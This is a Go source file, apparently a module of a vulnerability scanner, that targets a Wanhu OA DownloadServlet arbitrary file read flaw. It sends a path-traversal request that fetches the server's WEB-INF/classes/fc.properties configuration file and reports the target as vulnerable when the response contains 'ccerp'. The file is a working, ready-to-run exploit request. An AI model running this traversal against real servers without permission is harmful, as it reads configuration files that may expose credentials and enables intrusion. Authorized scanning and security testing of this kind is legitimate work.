package wanhu_DownloadServlet

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(8 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func checkVulnerability(url string) bool {
	vulnUrl := url + "/defaultroot/DownloadServlet?modeType=0&key=x&path=..&FileName=WEB-INF/classes/fc.properties&name=x&encrypt=x&cd=&downloadAll=2"
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).
		Get(vulnUrl)
	if err == nil && resp.StatusCode == 200 {
		body := resp.String()
		if strings.Contains(body, "ccerp") {
			return true
		}
	}
	return false
}

func Run(url string) {
	if checkVulnerability(url) {
		cheurl := url + "/defaultroot/DownloadServlet?modeType=0&key=x&path=..&FileName=WEB-INF/classes/fc.properties&name=x&encrypt=x&cd=&downloadAll=2"
		color.Green.Println("[+02] 万户OA DownloadServlet 任意文件读取漏洞存在 -> ", cheurl)
	} else {
		color.Red.Println("[+02] 万户OA DownloadServlet 任意文件读取漏洞不存在")
	}

}
